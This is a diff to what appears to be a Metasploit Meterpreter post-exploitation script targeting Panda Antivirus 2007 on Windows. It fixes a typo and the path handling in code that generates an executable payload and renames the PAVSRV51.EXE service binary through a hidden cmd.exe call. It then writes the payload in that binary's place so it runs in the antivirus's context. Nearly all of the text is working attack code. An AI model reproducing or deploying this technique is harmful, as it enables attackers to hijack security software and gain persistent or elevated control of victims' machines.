@@ -69,15 +69,16 @@ elsif client.platform =~ /win32|win64/
       exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
 
       # Change to our working directory.
-      workingdir = client.sys.config.getenv('ProgramFiles') + "\\Panda Software\\Panda Antivirus 2007\\"
-      client.fs.dir.chdir(workindir)
+      workingdir = client.fs.file.expand_path("%ProgramFiles%")
+      client.fs.dir.chdir(workingdir + "\\Panda Software\\Panda Antivirus 2007\\")
 
       # Create a backup of the original exe.
       print_status("Creating a copy of PAVSRV51 (PAVSRV51_back.EXE)...")
       client.sys.process.execute("cmd.exe /c rename PAVSRV51.EXE PAVSRV51_back.EXE", nil, {'Hidden' => 'true'})
 
       # Place our newly created exe with the orginal binary name.
-      tempexe = workingdir + "PAVSRV51.EXE"
+      tempdir = client.fs.file.expand_path("%ProgramFiles%")
+      tempexe = tempdir + "\\Panda Software\\Panda Antivirus 2007\\" + "PAVSRV51.EXE"
 
       print_status("Sending EXE payload '#{tempexe}'.")
       fd = client.fs.file.new(tempexe, "wb")
